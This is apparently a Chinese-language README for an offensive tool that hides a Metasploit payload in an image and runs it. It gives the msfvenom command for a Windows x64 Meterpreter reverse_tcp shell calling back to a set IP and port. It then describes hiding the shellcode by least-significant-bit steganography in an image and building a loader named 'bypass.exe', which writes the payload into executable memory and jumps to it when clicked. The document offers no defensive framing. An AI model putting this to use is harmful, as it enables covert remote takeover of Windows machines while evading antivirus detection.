## 信息隐藏 
1.msfvenom生成bin文件：
``` 
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.190.89.125 lport=1125 -f bin --arch x64 --platform windows -o test.bin
```
2.将图片RGB转为YCbCr值，获取到3个二维数组 

3.对Y平面数组采用lsb隐写 

4.将YCbCr转为RGB并生成图片 

## 信息读取 
1.将图片RGB转为YCbCr值，获取到3个二维数组 

2.读取Y平面的LSB获取payload 

## 执行payload 

1.分配可读可写可执行内存 

2.写入payload到内存 

3.跳转执行

# 使用方式：
1.msfvenom生成一个payload，必须是bin文件 
``` 
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.190.89.125 lport=1125 -f bin --arch x64 --platform windows -o test.bin
```
2.cargo build --release打包img程序，用得到的隐写程序img.exe将bin文件隐写到jpg文件 
``` 
img.exe hide your_img.jpg test.bin
```
3.cargo build --release打包bypass程序，记得把output.png放到bypass/src/resources目录下，得到bypass.exe 

4.点击bypass.exe即触发执行shellcode
